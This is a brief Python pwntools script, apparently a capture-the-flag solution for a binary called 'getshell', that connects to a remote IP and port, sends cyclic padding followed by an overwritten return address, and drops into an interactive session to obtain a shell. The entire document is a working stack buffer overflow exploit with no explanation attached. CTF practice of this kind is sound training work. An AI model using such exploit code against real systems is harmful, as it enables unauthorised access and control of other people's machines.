from pwn import *

# io=process("./getshell")
io=remote("1.14.71.254",28258)

func_addr=0x804851B
payload=cyclic(0x1c)+p32(func_addr)+p32(0)
io.sendline(payload)
io.interactive()




